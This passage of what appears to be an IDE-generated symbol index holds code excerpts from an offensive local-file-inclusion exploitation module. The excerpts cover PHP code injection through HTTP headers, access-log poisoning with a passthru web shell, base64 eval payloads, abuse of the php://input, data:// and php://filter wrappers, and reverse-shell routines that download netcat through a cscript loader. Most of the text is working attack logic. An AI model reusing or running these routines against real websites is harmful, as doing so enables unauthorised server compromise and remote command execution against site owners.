        "peekOfCode": "def cutURLToLastEqual(url):\n    indexes = SubstrFind(url, \"=\")\n    return url[0: indexes[len(indexes) - 1] + 1]\ndef extractPathFromUrl(url):\n    # Pre: url contains http:// or https:// declaration\n    slashes = SubstrFind(url, \"/\")\n    return url[(slashes[2]):]\ndef correctUrl(\n    url,\n):  # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "extractPathFromUrl",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def extractPathFromUrl(url):\n    # Pre: url contains http:// or https:// declaration\n    slashes = SubstrFind(url, \"/\")\n    return url[(slashes[2]):]\ndef correctUrl(\n    url,\n):  # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='\n    if url[len(url) - 1] == \"=\":\n        return url\n    eq = SubstrFind(url, \"=\")",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "correctUrl",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def correctUrl(\n    url,\n):  # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='\n    if url[len(url) - 1] == \"=\":\n        return url\n    eq = SubstrFind(url, \"=\")\n    if len(eq) == 0:\n        print(\"\\n[ERROR] Invalid URL syntax!\\n\")\n        sys.exit()\n    last = eq[len(eq) - 1]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "checkFilename",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def checkFilename(filename):  # useful in case of drag and drop\n    while True:\n        if filename[0] == \"'\":\n            filename = filename[1:]\n        if filename[len(filename) - 1] == \"'\":\n            filename = filename[:-1]\n        if os.path.exists(filename):\n            return filename\n        filename = input(\n            \"[!] Cannot find '%s'.\\n[*] Enter a valid name of the file containing the paths to test -> \"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "showInterestingPath",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def showInterestingPath(toPrint, stack):\n    print(\" %s: [%s]\" % (toPrint, len(stack)))\n    bar = \"-\" * 90\n    print(bar)\n    for path in stack:\n        print(path)\n    print(\"%s\\n\" % bar)\ndef generateRandom():\n    return \"AbracadabrA%s\" % randint(40, 999999)\ndef onlyPhpPrint():",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "generateRandom",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def generateRandom():\n    return \"AbracadabrA%s\" % randint(40, 999999)\ndef onlyPhpPrint():\n    print(\n        colored(\n            \"[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\\\"content\\\");]\\n\",\n            \"red\",\n        )\n    )\ndef invalidChoice():",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "onlyPhpPrint",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def onlyPhpPrint():\n    print(\n        colored(\n            \"[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\\\"content\\\");]\\n\",\n            \"red\",\n        )\n    )\ndef invalidChoice():\n    print(colored(\"\\n[Error] You entered an invalid choice!\\n\", \"red\"))\ndef exit():",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "invalidChoice",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def invalidChoice():\n    print(colored(\"\\n[Error] You entered an invalid choice!\\n\", \"red\"))\ndef exit():\n    print(\"\\nBye ;-)\\n\")\n    quit()\n# --------------------------------------------------------------/proc/self/environ------------------------------------------------------\nse_url = \"\"\nse_par = \"\"\nse_stopStr = \"\"\nse_header_par = \"\"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "exit",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def exit():\n    print(\"\\nBye ;-)\\n\")\n    quit()\n# --------------------------------------------------------------/proc/self/environ------------------------------------------------------\nse_url = \"\"\nse_par = \"\"\nse_stopStr = \"\"\nse_header_par = \"\"\nse_phponly = False\nse_header_pars = [",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def se_reverse_shell():\n    generic_reverse_shell()\n    print(cleanOutput(execSeCmd(correctString(reverseConn)), False))\ndef getTranslatedPar(word):\n    global se_header_conv\n    global se_header_pars\n    for i in range(0, len(se_header_pars)):\n        if word == se_header_pars[i]:\n            return se_header_conv[i]\ndef printSwitchUA():",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "getTranslatedPar",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def getTranslatedPar(word):\n    global se_header_conv\n    global se_header_pars\n    for i in range(0, len(se_header_pars)):\n        if word == se_header_pars[i]:\n            return se_header_conv[i]\ndef printSwitchUA():\n    print(\"\\n[!] The choice you made is not acceptable. Switching to HTTP_USER_AGENT.\")\ndef setHttpCookie():\n    global se_headers",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "printSwitchUA",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def printSwitchUA():\n    print(\"\\n[!] The choice you made is not acceptable. Switching to HTTP_USER_AGENT.\")\ndef setHttpCookie():\n    global se_headers\n    print(\n        \"\\n[Warning] In order to get the program working you need to provide a value for HTTP_COOKIE parameter.\"\n    )\n    print(\n        \"Why? Before injecting I perform a quick test to figure out how the web response is structured and how parameters are shown.\"\n    )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "setHttpCookie",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def setHttpCookie():\n    global se_headers\n    print(\n        \"\\n[Warning] In order to get the program working you need to provide a value for HTTP_COOKIE parameter.\"\n    )\n    print(\n        \"Why? Before injecting I perform a quick test to figure out how the web response is structured and how parameters are shown.\"\n    )\n    cookie_val = input(\"\\nHTTP_COOKIE (default: 'nope') -> \")\n    if len(cookie_val) == 0:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "chooseSe_Par",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def chooseSe_Par():\n    global se_par\n    if ahactive is False:\n        print(\"\\nChoose the parameter you prefer to inject\")\n        print(\"-------------------------------\")\n        for i in range(0, len(se_header_pars)):\n            print(\" %s) %s\" % (i + 1, se_header_pars[i]))\n        print(\" 8) AUTO-HACK\")\n        print(\"-------------------------------\")\n        try:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "cleanOutput",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def cleanOutput(output, newline):\n    output = (\n        output.replace(\"\\r\", \"\").replace(\"%c\" % chr(0), \"\").replace(\"\\t\", \"\")\n    )  # chr(0)=NUL\n    if newline:\n        output = output.replace(\"\\n\", \"\")\n    return output\ndef execSeCmd(cmd):\n    global se_par\n    global se_headers",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "execSeCmd",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def execSeCmd(cmd):\n    global se_par\n    global se_headers\n    if se_phponly is False:\n        se_headers[\"%s\" % se_header_par] = '<?php system(\"%s\"); ?>' % cmd\n    else:\n        if \";\" not in cmd[-2:]:\n            cmd = \"%s;\" % cmd\n        se_headers[\"%s\" % se_header_par] = \"<?php %s ?>\" % cmd\n        # print \"se_headers = %s\\n---------\" %se_headers # useful for debugging",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "restoreVars",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def restoreVars():\n    global se_par\n    global se_header_par\n    global se_headers\n    global se_stopStr\n    se_headers = gen_headers\n    se_par = \"\"\n    se_stopStr = \"\"\n    se_header_par = \"\"\ndef correctString(s):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "correctString",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def correctString(s):\n    correct = \"\"\n    for c in s:\n        if c == '\"':\n            correct += \"\\\\\"\n        correct += c\n    return correct\ndef se_fail(par):\n    print(\"\\n[-] LFI did not work over the parameter '%s'.\" % se_par)\n    if par == \"None\":",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_fail",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def se_fail(par):\n    print(\"\\n[-] LFI did not work over the parameter '%s'.\" % se_par)\n    if par == \"None\":\n        print(\n            \"[ADVICE] Run the Auto-Hack module to see if the other parameters are vulnerable (it happens!) :-)\\n\"\n        )\ndef hackSE(par):\n    global se_par\n    global se_header_pars\n    global se_header_par",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "hackSE",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def hackSE(par):\n    global se_par\n    global se_header_pars\n    global se_header_par\n    global se_headers\n    global se_stopStr\n    global se_phponly\n    if par != \"None\":\n        se_par = par\n    se_header_par = getTranslatedPar(se_par)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_self_environ",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_self_environ():\n    global se_url\n    global se_headers\n    global se_header_pars\n    global ahactive\n    global ahenvurl\n    if ahactive is False:\n        se_url = input(\"\\n[*] Enter the /proc/self/environ vulnerable URL -> \")\n    else:\n        se_url = ahenvurl",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "windows_phpinfo_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def windows_phpinfo_reverse_shell(headers, lfipath, phpinfopath, host):\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        phpinfo_request(headers, cmd, lfipath, phpinfopath, 0, host)\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)\n        phpinfo_request(headers, cscript, lfipath, phpinfopath, 0, host)\n    windows_reverse_shell()\n    print(phpinfo_request(headers, reverseConn, lfipath, phpinfopath, 0, host))\ndef phpinfo_reverse_shell(headers, lfipath, phpinfopath, host):\n    generic_reverse_shell()",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "phpinfo_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def phpinfo_reverse_shell(headers, lfipath, phpinfopath, host):\n    generic_reverse_shell()\n    print(phpinfo_request(headers, reverseConn, lfipath, phpinfopath, 0, host))\ndef phpinfo_ext(content):\n    indexes = SubstrFind(content, \"AbracadabrA\")\n    found = len(indexes) > 0\n    got = \"\"\n    if found:\n        start = indexes[0] + 11\n        for x in range(start, len(content)):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "phpinfo_ext",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def phpinfo_ext(content):\n    indexes = SubstrFind(content, \"AbracadabrA\")\n    found = len(indexes) > 0\n    got = \"\"\n    if found:\n        start = indexes[0] + 11\n        for x in range(start, len(content)):\n            if content[x] == \"<\":\n                break\n            got += content[x]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "phpinfo_request",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def phpinfo_request(headers, cmd, path1, path, test, host):\n    rcvbuf = 1024\n    bigz = 3000\n    junkheaders = 30\n    junkfiles = 40\n    junkfilename = \">\" * 100000\n    z = \"Z\" * bigz\n    found = 0\n    phpinfo_headers = {\n        \"User-Agent\": \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8\",",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_phpinfo",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_phpinfo():\n    global phpinfo_reverse\n    global victimOs\n    if ahactive is False:\n        host = input(\n            \"[*] Enter the website without path (ex: 'http://justsitename') -> \"\n        )\n        lfipath = input(\n            \"[*] Enter the vulnerable LFI path (ex: '/lfi.php?file=../..') -> \"\n        )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "base64_check",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def base64_check(c):\n    t = ord(c)\n    if (\n        (65 <= t <= 90)\n        or (97 <= t <= 122)\n        or (48 <= t <= 57)\n        or (t == 43)\n        or (t == 47)\n        or (t == 61)\n    ):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "phpfilter_extract",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def phpfilter_extract(content):\n    ftemp = \"\"\n    found = []\n    lines = content.split(\"\\n\")\n    for line in lines:\n        ftemp = \"\"\n        length = len(line)\n        for x in range(0, length):\n            if base64_check(line[x]):\n                ftemp += line[x]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_phpfilter",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_phpfilter():\n    global ahactive\n    global ahurl\n    if ahactive is False:\n        ofilterurl = input(\n            \"[*] Enter the php://filter vulnerable url (ex: 'http://site/index.php?page=') -> \"\n        )\n    else:\n        ofilterurl = ahurl\n    ofilterurl = correctUrl(ofilterurl)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "access_log_windows_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def access_log_windows_reverse_shell(host, keyword, ologurl):\n    global access_log_reverse\n    access_log_reverse = True\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        send_access_log_cmd(cmd, host, keyword)\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)\n        send_access_log_cmd(cscript, host, keyword)\n    windows_reverse_shell()\n    send_access_log_cmd(reverseConn, host, keyword)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "access_log_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def access_log_reverse_shell(host, keyword, ologurl):\n    global access_log_reverse\n    access_log_reverse = True\n    generic_reverse_shell()\n    send_access_log_cmd(reverseConn, host, keyword)\n    print(cleanOutput(access_log_ext(ologurl, '\"%s /' % keyword), False))\ndef access_control(resp, keyword, rand_str):\n    lines = resp.split(\"\\n\")\n    if \"_PHP\" in keyword:  # in case system() calls have been disabled\n        keyword = keyword[:-4]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "access_control",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def access_control(resp, keyword, rand_str):\n    lines = resp.split(\"\\n\")\n    if \"_PHP\" in keyword:  # in case system() calls have been disabled\n        keyword = keyword[:-4]\n    if (\n        len(SubstrFind(resp, rand_str)) > 0\n        and len(SubstrFind(resp, \"echo %s\" % rand_str)) == 0\n        and len(SubstrFind(resp, \"echo%%20%s\" % rand_str)) == 0\n    ):\n        return True",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_access_log_cmd",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_access_log_cmd(cmd, host, keyword):\n    path = \"\"\n    if \"_PHP\" in keyword:\n        keyword = keyword[:-4]\n        if \" \" in cmd:\n            b64cmd = base64.b64encode(cmd)\n            path = \"/<?php eval(base64_decode('%s'));?>\" % b64cmd\n        else:\n            path = \"/<?php %s?>\" % cmd\n    else:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "access_log_ext",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def access_log_ext(url, keyword):\n    global access_log_reverse\n    if access_log_reverse:\n        r = requests.get(url, headers=gen_headers)\n    else:\n        r = requests.get(url, headers=gen_headers, timeout=15)\n    resp = r.text\n    get_indexes = SubstrFind(resp, keyword)\n    nget = len(get_indexes)\n    if nget > 0:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "access_log_while",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def access_log_while(whoami, logmain, pwd, ologurl, keyword, windows):\n    cmd = \"\"\n    while cmd != \"exit\" and cmd != \"quit\":\n        cmd = input(\"%s@%s:%s$ \" % (whoami, logmain.split(\"/\")[2], pwd))\n        cmd = cmd.replace(\"'\", '\"')\n        if cmd != \"exit\" and cmd != \"quit\":\n            if checkIfReverseShell(cmd):\n                if windows is False:\n                    access_log_reverse_shell(logmain, keyword, ologurl)\n                else:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "simpleGETorHEAD",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def simpleGETorHEAD(keyword, ologurl, logmain):\n    randStr = generateRandom()\n    send_access_log_cmd(\"echo %s\" % randStr, logmain, keyword)\n    if access_log_reverse:\n        r = requests.get(ologurl, headers=gen_headers)\n    else:\n        r = requests.get(ologurl, headers=gen_headers, timeout=15)\n    resp = r.text\n    print(\n        colored(",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "windows_passthru_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def windows_passthru_reverse_shell(ologurl, start_get):\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        print(cleanOutput(send_passthru_cmd(ologurl, cmd, start_get), False))\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)\n        print(cleanOutput(send_passthru_cmd(ologurl, cscript, start_get), False))\n    windows_reverse_shell()\n    print(cleanOutput(send_passthru_cmd(ologurl, reverseConn, start_get), False))\ndef passthru_reverse_shell(ologurl, start_get):\n    generic_reverse_shell()",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "passthru_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def passthru_reverse_shell(ologurl, start_get):\n    generic_reverse_shell()\n    print(cleanOutput(send_passthru_cmd(ologurl, reverseConn, start_get), False))\ndef send_passthru_req(host):\n    s = NoURLEncodingSession()\n    s.get(\"%s/<?php passthru($_GET['cmd']);?>\" % host, headers=gen_headers)\ndef passthru_ext(resp, start_get):\n    start = (SubstrFind(resp, \"GET /\"))[start_get - 1]\n    resp = resp[start:]\n    stop = (SubstrFind(resp, \" HTTP/1.1\"))[0]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_passthru_req",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_passthru_req(host):\n    s = NoURLEncodingSession()\n    s.get(\"%s/<?php passthru($_GET['cmd']);?>\" % host, headers=gen_headers)\ndef passthru_ext(resp, start_get):\n    start = (SubstrFind(resp, \"GET /\"))[start_get - 1]\n    resp = resp[start:]\n    stop = (SubstrFind(resp, \" HTTP/1.1\"))[0]\n    stop_apix = (SubstrFind(resp, '\"'))[0]\n    if stop_apix < stop:\n        stop = stop_apix",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "passthru_ext",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def passthru_ext(resp, start_get):\n    start = (SubstrFind(resp, \"GET /\"))[start_get - 1]\n    resp = resp[start:]\n    stop = (SubstrFind(resp, \" HTTP/1.1\"))[0]\n    stop_apix = (SubstrFind(resp, '\"'))[0]\n    if stop_apix < stop:\n        stop = stop_apix\n    output = \"\"\n    for x in range(5, stop):\n        output += resp[x]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_passthru_cmd",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_passthru_cmd(ologurl, cmd, start_get):\n    url = \"%s&cmd=%s\" % (ologurl, cmd)\n    if cmd == reverseConn:\n        r = requests.get(url, headers=gen_headers)\n    else:\n        r = requests.get(url, headers=gen_headers, timeout=15)\n    resp = r.text\n    return passthru_ext(resp, start_get)\ndef GetPassthru(ologurl, logmain):\n    global victimOs",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "GetPassthru",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def GetPassthru(ologurl, logmain):\n    global victimOs\n    print(\n        colored(\n            \"\\nTrying to inject the website using GET 'passthru' requests.\", \"white\"\n        )\n    )\n    rand_str = generateRandom()\n    url = \"%s&cmd=echo %s\" % (ologurl, rand_str)\n    resp = (requests.get(url, headers=gen_headers, timeout=20)).text",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_access_log",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_access_log():\n    global ahactive\n    global ahlogurl\n    if ahactive is False:\n        ologurl = input(\n            \"[*] Enter the vulnerable access_log url (ex: 'site/index.php?page=../logs/access_log') -> \"\n        )\n    else:\n        ologurl = ahlogurl\n    ologurl = checkHttp(ologurl)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "windows_phpinput_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def windows_phpinput_reverse_shell(inputurl):\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        send_phpinput_cmd(cmd, inputurl)\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)\n        send_phpinput_cmd(cscript, inputurl)\n    windows_reverse_shell()\n    send_phpinput_cmd(reverseConn, inputurl)\ndef phpinput_reverse_shell(inputurl):\n    global reverseConn",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "phpinput_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def phpinput_reverse_shell(inputurl):\n    global reverseConn\n    generic_reverse_shell()\n    send_phpinput_cmd(reverseConn, inputurl)\ndef send_phpinput_cmd(cmd, inputurl):\n    global gen_headers\n    if inputurl[-11:] == \"php://input\":\n        inputurl = inputurl[:-11]\n    url = \"%sphp://input\" % inputurl\n    phpcmd = cmd[:6] == \"php://\"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_phpinput_cmd",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_phpinput_cmd(cmd, inputurl):\n    global gen_headers\n    if inputurl[-11:] == \"php://input\":\n        inputurl = inputurl[:-11]\n    url = \"%sphp://input\" % inputurl\n    phpcmd = cmd[:6] == \"php://\"\n    body = \"\"\n    if phpcmd:\n        cmd = cmd[6:]\n        length = 27 + len(cmd)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "extract_phpinput_res",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def extract_phpinput_res(resp):\n    strs = SubstrFind(resp, \"AbracadabrA **\")\n    try:\n        p = strs[0] + 15\n    except:\n        return \"\"\n    got = \"\"\n    while p < len(resp) - 1 and (resp[p] != \"*\" or resp[p + 1] != \"*\"):\n        got += resp[p]\n        p += 1",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_phpinput",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_phpinput():\n    global ahurl\n    global ahactive\n    global victimOs\n    if ahactive is False:\n        inputurl = input(\n            \"[*] Enter the php://input vulnerable url (ex: 'http://site/index.php?page=') -> \"\n        )\n    else:\n        inputurl = ahurl",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "windows_data_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def windows_data_reverse_shell(odataurl, found):\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        cleanOutput(\n            extract_data_res(send_data_cmd_default(\n                cleanDataCmd(cmd), odataurl, found)),\n            False,\n        )\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)\n        cleanOutput(",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "data_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def data_reverse_shell(odataurl, found):\n    generic_reverse_shell()\n    print(\n        \"%s\\n\"\n        % cleanOutput(\n            extract_data_res(\n                send_data_cmd_default(cleanDataCmd(\n                    reverseConn), odataurl, found)\n            ),\n            False,",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_data_cmd_generic",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_data_cmd_generic(url):\n    if data_reverse:\n        content = (requests.get(url, headers=gen_headers)).text\n    else:\n        content = (requests.get(url, headers=gen_headers, timeout=15)).text\n    return content\ndef send_data_cmd_simple_nosl(cmd, url):\n    # print \"requested URL: %sdata:,%s\" %(url,cmd)\n    return send_data_cmd_generic(\"%sdata:,%s\" % (url, cmd))\ndef send_data_cmd_simple_sl(cmd, url):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_data_cmd_simple_nosl",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_data_cmd_simple_nosl(cmd, url):\n    # print \"requested URL: %sdata:,%s\" %(url,cmd)\n    return send_data_cmd_generic(\"%sdata:,%s\" % (url, cmd))\ndef send_data_cmd_simple_sl(cmd, url):\n    # print \"requested URL: %sdata://,%s\" %(url,cmd)\n    return send_data_cmd_generic(\"%sdata://,%s\" % (url, cmd))\ndef send_data_cmd_b64_nosl(cmd, url):\n    enc = base64.b64encode(cmd)\n    # print \"requested URL: %sdata:,%s\" %(url,enc)\n    return send_data_cmd_generic(\"%sdata:text/plain;base64,%s\" % (url, enc))",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_data_cmd_simple_sl",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
